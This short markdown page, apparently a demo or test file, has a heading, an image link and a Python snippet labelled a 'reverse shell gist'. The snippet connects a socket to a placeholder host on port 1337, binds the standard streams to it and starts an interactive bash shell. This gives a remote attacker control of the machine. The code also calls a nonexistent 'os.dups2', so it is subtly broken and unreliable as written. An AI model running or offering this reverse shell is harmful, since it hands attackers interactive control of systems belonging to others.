# This is a H1 Tag

![Image of Yaktocat](https://octodex.github.com/images/yaktocat.png)

```python
# This is a python reverse shell gist
import os
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("x.x.x.x", 1337))

os.dups2(s.fileno(),0)
os.dups2(s.fileno(),1)
os.dups2(s.fileno(),2)

subprocess.call(["/bin/bash", "-i"])
```
